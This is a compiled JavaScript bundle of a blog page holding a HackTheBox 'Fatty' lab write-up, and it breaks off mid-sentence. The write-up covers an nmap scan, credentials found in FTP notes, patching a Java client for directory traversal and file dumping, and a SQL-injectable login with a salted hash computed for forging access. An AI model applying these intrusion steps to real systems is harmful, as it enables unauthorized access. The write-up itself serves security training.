"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7530],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),u=c(n),m=r,h=u["".concat(l,".").concat(m)]||u[m]||d[m]||o;return n?a.createElement(h,s(s({ref:t},p),{},{components:n})):a.createElement(h,s({ref:t},p))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=m;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[u]="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=n[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},83441:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>d,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const o={layout:"post",title:"Fatty ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","java","jar","deserialization","code-review"],date:"2020/08/08",thumbnail:"/img/HackTheBox/fatty.png",toc:!0},s="Information",i={unversionedId:"HackTheBox/Fatty/write-up",id:"HackTheBox/Fatty/write-up",title:"Fatty ",description:"- Name: Fatty",source:"@site/writeups/HackTheBox/Fatty/write-up.md",sourceDirName:"HackTheBox/Fatty",slug:"/HackTheBox/Fatty/write-up",permalink:"/writeups/HackTheBox/Fatty/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"java",permalink:"/writeups/tags/java"},{label:"jar",permalink:"/writeups/tags/jar"},{label:"deserialization",permalink:"/writeups/tags/deserialization"},{label:"code-review",permalink:"/writeups/tags/code-review"}],version:"current",frontMatter:{layout:"post",title:"Fatty ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","pe","exploit","htb","java","jar","deserialization","code-review"],date:"2020/08/08",thumbnail:"/img/HackTheBox/fatty.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Dyplesher ",permalink:"/writeups/HackTheBox/Dyplesher/write-up"},next:{title:"ForwardSlash ",permalink:"/writeups/HackTheBox/ForwardSlash/write-up"}},l={},c=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"FTP",id:"ftp",level:2},{value:"Java decompiling",id:"java-decompiling",level:2},{value:"Client discovery",id:"client-discovery",level:2},{value:"Code analysis: fatty client",id:"code-analysis-fatty-client",level:2},{value:"Code analysis: fatty server",id:"code-analysis-fatty-server",level:2},{value:"Java object deserialization exploit",id:"java-object-deserialization-exploit",level:2},{value:"System reconnaissance",id:"system-reconnaissance",level:2},{value:"Privilege Escalation of Machine",id:"privilege-escalation-of-machine",level:2}],p={toc:c},u="wrapper";function d(e){let{components:t,...o}=e;return(0,r.kt)(u,(0,a.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Fatty"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/227"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Insane"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 50")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"fatty",src:n(85266).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": Java code review, bytecode JAR modification; exploit deserialization."),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"pacman -S nmap filezilla jd-gui recaf\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Mon Jul 20 19:58:26 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.174\nNmap scan report for 10.10.10.174\nHost is up (0.022s latency).\nNot shown: 65530 closed ports\nPORT     STATE SERVICE            VERSION\n21/tcp   open  ftp                vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar\n| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt\n| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt\n|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to 10.10.15.33\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)\n| ssh-hostkey:\n|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)\n|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)\n1337/tcp open  ssl/waste?\n...\n| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE\n| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE\n| Public Key type: rsa\n| Public Key bits: 4096\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2019-09-11T15:42:00\n| Not valid after:  2020-09-10T15:42:00\n| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e\n|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1\n|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.\n1338/tcp open  ssl/wmc-log-svc?\n...\n| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE\n| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE\n| Public Key type: rsa\n| Public Key bits: 4096\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2019-09-11T15:42:00\n| Not valid after:  2020-09-10T15:42:00\n| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e\n|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1\n|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.\n1339/tcp open  ssl/kjtsiteserver?\n...\n| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE\n| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE\n| Public Key type: rsa\n| Public Key bits: 4096\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2019-09-11T15:42:00\n| Not valid after:  2020-09-10T15:42:00\n| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e\n|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1\n|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.\n...\nHost script results:\n|_clock-skew: mean: 5m07s, deviation: 0s, median: 5m07s\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Mon Jul 20 20:00:04 2020 -- 1 IP address (1 host up) scanned in 97.47 seconds\n")),(0,r.kt)("h2",{id:"ftp"},"FTP"),(0,r.kt)("p",null,"With ",(0,r.kt)("inlineCode",{parentName:"p"},"FileZilla")," we can retrieve the files available on the anonymously\naccessible FTP server."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar\n| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt\n| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt\n|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"note.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Dear members,\n\nbecause of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.\nFurthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice\nif you use different servers from day to day to balance the server load.\n\nWe were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of\ndoing it yourself ;)\n\nBest regards,\nqtc\n")),(0,r.kt)("p",null,"So we will need to decompile the jar, change the port and recompile it."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"note2.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Dear members,\n\nwe are currently experimenting with new java layouts. The new client uses a static layout. If your\nare using a tiling window manager or only have a limited screen size, try to resize the client window\nuntil you see the login from.\n\nFurthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11\nper default, you may need to install it manually.\n\nBest regards,\nqtc\n")),(0,r.kt)("p",null,"We may need to use Java 8, I have one if needed:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ archlinux-java status\nAvailable Java environments:\n  java-10-openjdk\n  java-14-openjdk (default)\n  java-8-openjdk\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"note3.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Dear members,\n\nWe had to remove all other user accounts because of some seucrity issues.\nUntil we have fixed these issues, you can use my account:\n\nUser: qtc\nPass: clarabibi\n\nBest regards,\nqtc\n")),(0,r.kt)("p",null,"We will be able to use those creds."),(0,r.kt)("h2",{id:"java-decompiling"},"Java decompiling"),(0,r.kt)("p",null,"Let's open ",(0,r.kt)("inlineCode",{parentName:"p"},"fatty-client.jar")," in ",(0,r.kt)("a",{parentName:"p",href:"https://java-decompiler.github.io/"},"jd-gui"),"."),(0,r.kt)("p",null,"In the ",(0,r.kt)("inlineCode",{parentName:"p"},"beans.xml")," config file, we can retrieve the server connection\ninformation, a keystore, and a secret."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-xml"},'<?xml version = "1.0" encoding = "UTF-8"?>\n\n<beans xmlns="http://www.springframework.org/schema/beans"\n    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n    xsi:schemaLocation="\n                http://www.springframework.org/schema/beans\n                spring-beans-3.0.xsd">\n\n\x3c!-- Here we have an constructor based injection, where Spring injects required arguments inside the\n     constructor function. --\x3e\n   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">\n      <constructor-arg index="0" value = "server.fatty.htb"/>\n      <constructor-arg index="1" value = "8000"/>\n   </bean>\n\n\x3c!-- The next to beans use setter injection. For this kind of injection one needs to define an default\nconstructor for the object (no arguments) and one needs to define setter methods for the properties. --\x3e\n   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">\n      <property name = "keystorePath" value = "fatty.p12"/>\n   </bean>\n\n   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">\n      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>\n   </bean>\n\n\x3c!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --\x3e\n   <bean id="connection" class = "htb.fatty.client.connection.Connection">\n      <constructor-arg index = "0" ref = "connectionContext"/>\n      <constructor-arg index = "1" ref = "trustedFatty"/>\n      <constructor-arg index = "2" ref = "secretHolder"/>\n   </bean>\n\n</beans>\n')),(0,r.kt)("p",null,"Let's change the port value form ",(0,r.kt)("inlineCode",{parentName:"p"},"8080")," to ",(0,r.kt)("inlineCode",{parentName:"p"},"1337")," in ",(0,r.kt)("inlineCode",{parentName:"p"},"beans.xml")," and then\nupdate the jar archive. We also remove the files used for signature so Java\ndoesn't complain ",(0,r.kt)("inlineCode",{parentName:"p"},"beans.xml")," doesn't match the signature anymore."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ jar -uf fatty-client-patched.jar beans.xml\n$ zip -d fatty-client-patched.jar META-INF/1.RSA META-INF/1.SF\ndeleting: META-INF/1.SF\ndeleting: META-INF/1.RSA\n")),(0,r.kt)("p",null,"Then we can run our patched version ",(0,r.kt)("inlineCode",{parentName:"p"},"java -jar fatty-client-patched.jar"),"."),(0,r.kt)("p",null,"But before, we need to add the local domain in our hosts file and to set Java 8."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep fatty\n10.10.10.174 server.fatty.htb\n\n$ archlinux-java set java-8-openjdk\n")),(0,r.kt)("p",null,"Now we can log in and discover the fat client from a user point of view."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/bg9IPJr.png",alt:null})),(0,r.kt)("h2",{id:"client-discovery"},"Client discovery"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Profile",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Whoami: \u2705"),(0,r.kt)("li",{parentName:"ul"},"ChangePassword: \u274c"))),(0,r.kt)("li",{parentName:"ul"},"ServerStatus",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Uname: \u274c"),(0,r.kt)("li",{parentName:"ul"},"Users: \u274c"),(0,r.kt)("li",{parentName:"ul"},"Netstat: \u274c"),(0,r.kt)("li",{parentName:"ul"},"Ipconfig: \u274c"))),(0,r.kt)("li",{parentName:"ul"},"FileBrowser: seems like a ",(0,r.kt)("inlineCode",{parentName:"li"},"ls")," on a hardcoded folder",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Configs: \u2705"),(0,r.kt)("li",{parentName:"ul"},"Notes: \u2705"),(0,r.kt)("li",{parentName:"ul"},"Mail: \u2705"))),(0,r.kt)("li",{parentName:"ul"},"ConnectionTest:",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Ping: \u2705"))),(0,r.kt)("li",{parentName:"ul"},"Help",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"Contact: \u2705"),(0,r.kt)("li",{parentName:"ul"},"About: \u2705")))),(0,r.kt)("p",null,"There is also an ",(0,r.kt)("inlineCode",{parentName:"p"},"Open")," feature that read a file (seems to exclude comments),\nit seems it's not possible to do directory traversal but we can ",(0,r.kt)("inlineCode",{parentName:"p"},"cd")," in the\nFileBrowser files and read them."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"security.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Since our fatty clients processes sensitive data, we were forced to perform a penetration test on it.\nI had no time to look at the results yet in more detail, but it looks like there are a few criticals.\nWe should starting to fix these issues ASAP.\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"dave.txt")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Hey qtc,\n\nuntil the issues from the current pentest are fixed we have removed all administrative users from the database.\nYour user account is the only one that is left. Since you have only user permissions, this should prevent exploitation\nof the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are\ntherefore no longer possible.\n\nBest regards,\nDave\n")),(0,r.kt)("h2",{id:"code-analysis-fatty-client"},"Code analysis: fatty client"),(0,r.kt)("p",null,"With ",(0,r.kt)("a",{parentName:"p",href:"https://java-decompiler.github.io/"},"JD-GUI")," or other decompiler we can decompile the code to read it.\nWith ",(0,r.kt)("inlineCode",{parentName:"p"},"jar -uf")," we can easily update a text file like ",(0,r.kt)("inlineCode",{parentName:"p"},"beans.xml")," but we can't\nupdate code in the JAR because the code is compiled (",(0,r.kt)("inlineCode",{parentName:"p"},".class"),").\nTrying to compile our ",(0,r.kt)("inlineCode",{parentName:"p"},".java")," won't probably do any good as there are not\nthe original code but ones obtained through decompilation.\nSo the best idea is to update the original JAR via a Java bytecode editor."),(0,r.kt)("p",null,"I used ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Col-E/Recaf"},"Recaf")," for that."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/client/gui/ClientGuiTest.java")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'        openFileButton.addActionListener(new ActionListener(){\n\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                if (ClientGuiTest.this.currentFolder == null) {\n                    JOptionPane.showMessageDialog(controlPanel, "No folder selected! List a directory first!", "Error", 0);\n                    return;\n                }\n                String response = "";\n                String fileName = ClientGuiTest.this.fileTextField.getText();\n                fileName.replaceAll("[^a-zA-Z0-9.]", "");\n                try {\n                    response = ClientGuiTest.this.invoker.open(ClientGuiTest.this.currentFolder, fileName);\n                }\n                catch (MessageBuildException | MessageParseException e1) {\n                    JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);\n                }\n                catch (IOException e2) {\n                    JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);\n                }\n                textPane.setText(response);\n            }\n        });\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'        openFileButton.addActionListener(new ActionListener(){\n\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                String response = "";\n                String fileName = ClientGuiTest.this.fileTextField.getText();\n                try {\n                    response = ClientGuiTest.this.invoker.open("..", fileName);\n                }\n                catch (MessageBuildException | MessageParseException e1) {\n                    JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);\n                }\n                catch (IOException e2) {\n                    JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);\n                }\n                textPane.setText(response);\n            }\n        });\n')),(0,r.kt)("p",null,"But still ",(0,r.kt)("inlineCode",{parentName:"p"},"/opt/fatty/files")," prefix. Putting ",(0,r.kt)("inlineCode",{parentName:"p"},"/")," in foldername is filtered server-side\ntoo."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/H8s7Hyw.png",alt:null})),(0,r.kt)("p",null,"Too see what's in that folder let's modify the function that list files in one\nfolder, from:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'configs.addActionListener(new ActionListener()\n    {\n      public void actionPerformed(ActionEvent e) {\n        String response = "";\n        ClientGuiTest.this.currentFolder = "configs";\n        try {\n          response = ClientGuiTest.this.invoker.showFiles("configs");\n        } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {\n          JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);\n        }\n        catch (IOException e2) {\n          JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);\n    }\n')),(0,r.kt)("p",null,"to:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'configs.addActionListener(new ActionListener()\n    {\n      public void actionPerformed(ActionEvent e) {\n        String response = "";\n        ClientGuiTest.this.currentFolder = "..";\n        try {\n          response = ClientGuiTest.this.invoker.showFiles("..");\n        } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {\n          JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);\n        }\n        catch (IOException e2) {\n          JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);\n    }\n')),(0,r.kt)("p",null,"So by going to ",(0,r.kt)("inlineCode",{parentName:"p"},"FileBrowser -> Configs")," we can list what is in ",(0,r.kt)("inlineCode",{parentName:"p"},"/opt/fatty/"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"logs\ntar\nstart.sh\nfatty-server.jar\nfiles\n")),(0,r.kt)("p",null,"We now have the name of the server JAR: ",(0,r.kt)("inlineCode",{parentName:"p"},"fatty-server.jar"),"."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"}," /opt/fatty/start.sh")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'#!/bin/sh\n\n# Unfortunately alpine docker containers seems to have problems with services.\n# I tried both, ssh and cron to start via openrc, but non of them worked. Therefore,\n# both services are now started as part of the docker startup script.\n\n\n# Start cron service\ncrond -b\n\n# Start ssh server\n/usr/sbin/sshd\n\n# Start Java application server\nsu - qtc /bin/sh -c "java -jar /opt/fatty/fatty-server.jar"\n')),(0,r.kt)("p",null,"The server seems to be run as ",(0,r.kt)("inlineCode",{parentName:"p"},"qtc")," so we won't elevate our privilege directly."),(0,r.kt)("p",null,"By doing the same with ",(0,r.kt)("inlineCode",{parentName:"p"},"logs")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"tar")," we can see what's inside:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/opt/fatty/logs/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"error-log.txt\ninfo-log.txt\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/opt/fatty/tar/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"logs.tar\n")),(0,r.kt)("p",null,"What we could access is ",(0,r.kt)("inlineCode",{parentName:"p"},"/opt/fatty/fatty-server.jar")," but we can only read text\nfiles, not binaries:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'grep -rn binar htb\nhtb/fatty/client/methods/Invoker.java:140:       response = "Unable to convert byte[] to String. Did you read in a binary file?";\n')),(0,r.kt)("p",null,"So we will have to modify the function to save the file locally on our\nfilesystem."),(0,r.kt)("p",null,"We'll hack into ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/client/methods/Invoker.java"),", the ",(0,r.kt)("inlineCode",{parentName:"p"},"public String open"),"\nmethod.\nWe'll modify that part, from"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'/*     */     try {\n/* 138 */       response = this.response.getContentAsString();\n/* 139 */     } catch (Exception e) {\n/* 140 */       response = "Unable to convert byte[] to String. Did you read in a binary file?";\n/*     */     }\n')),(0,r.kt)("p",null,"to"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'import java.io.File;\nimport java.io.FileOutputStream;\n\ntry {\n  response = "Write to local FS...";\n  File file = new File(filename);\n  FileOutputStream outputStream = new FileOutputStream(file);\n  outputStream.write(this.response.getContent());\n  outputStream.close();\n} catch (Exception e) {\n  response - "Error";\n}\n')),(0,r.kt)("p",null,"or"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'import java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\ntry {\n  response = "Write to local FS...";\n  Path path = Paths.get(filename);\n  Files.write(path, this.response.getContent());\n} catch (Exception e) {\n  response - "Error";\n}\n')),(0,r.kt)("p",null,"or even:"),(0,r.kt)("p",null,"Let's try to add a method in ",(0,r.kt)("inlineCode",{parentName:"p"},"/htb/fatty/shared/message/ResponseMessage.java")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},"import java.io.FileOutputStream;\n\n    public void saveContentToFile(String filename) {\n        try(FileOutputStream stream = new FileOutputStream(filename)) {\n            stream.write(this.content);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n")),(0,r.kt)("p",null,"and then in ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/client/methods/Invoker.java"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'try {\n  response = "Write to local FS...";\n  this.response.saveContentToFile(filename);\n} catch (Exception e) {\n  response = "Error";\n}\n')),(0,r.kt)("p",null,"With one of those 3 ways we are able to dump binary files.\nLet's dump ",(0,r.kt)("inlineCode",{parentName:"p"},"fatty-server.jar"),":"),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/lSf53kW.png",alt:null})),(0,r.kt)("h2",{id:"code-analysis-fatty-server"},"Code analysis: fatty server"),(0,r.kt)("p",null,"Now let's decompiler the server JAr with ",(0,r.kt)("a",{parentName:"p",href:"https://java-decompiler.github.io/"},"JD-GUI")," again and export\nthe code to read it with VSCode."),(0,r.kt)("p",null,"It's maybe time to looks for the the SQLi, we already know it's in the\nconnection code."),(0,r.kt)("p",null,"The SQL queries seem to be handle in ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/server/database/FattyDbSession.java"),"."),(0,r.kt)("p",null,"The authentication function looks like that:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public User checkLogin(User user) throws LoginException {\n  Statement stmt = null;\n  ResultSet rs = null;\n  User newUser = null;\n\n  try {\n    stmt = this.conn.createStatement();\n    rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username=\'" + user.getUsername() + "\'");\n\n    try {\n      Thread.sleep(3000L);\n    } catch (InterruptedException e) {\n      return null;\n    }\n\n    if (rs.next()) {\n\n      int id = rs.getInt("id");\n      String username = rs.getString("username");\n      String email = rs.getString("email");\n      String password = rs.getString("password");\n      String role = rs.getString("role");\n      newUser = new User(id, username, password, email, Role.getRoleByName(role), false);\n\n      if (newUser.getPassword().equalsIgnoreCase(user.getPassword())) {\n        return newUser;\n      }\n      throw new LoginException("Wrong Password!");\n    }\n\n    throw new LoginException("Wrong Username!");\n  }\n  catch (SQLException e) {\n    this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username=\'" + user.getUsername() + "\' <==");\n    this.logger.logError("[-] Exception was: \'" + e.getMessage() + "\'");\n\n    return null;\n  }\n}\n')),(0,r.kt)("p",null,"We can see the ",(0,r.kt)("inlineCode",{parentName:"p"},"Thread.sleep(3000L);")," that make time-based attacks difficult\nbut that doesn't mean we can't make a one-shot SQLi as we still control the\nusername injected in the query."),(0,r.kt)("p",null,"Before we forge a payload, let's take a look at the password format saved in DB.\nWe can see in ",(0,r.kt)("inlineCode",{parentName:"p"},"htb/fatty/shared/resources/User.java")," is salted and hashed."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-java"},'public void setPassword(String password) {\n  String hashString = this.username + password + "clarabibimakeseverythingsecure";\n  MessageDigest digest = null;\n  try {\n    digest = MessageDigest.getInstance("SHA-256");\n  } catch (NoSuchAlgorithmException e) {\n    e.printStackTrace();\n  }\n  byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));\n  this.password = DatatypeConverter.printHexBinary(hash);\n}\n')),(0,r.kt)("p",null,"Let's compute the hash:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ printf %s 'qtcclarabibiclarabibimakeseverythingsecure' | sha256sum\n5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046  -\n")),(0,r.kt)("p",null,"We can also note that only password is checked and only username is used for\nuser retrieval, that means we can inject whatever we want in the ID field or\nemail address.\nBut what matters to us is to change our role from 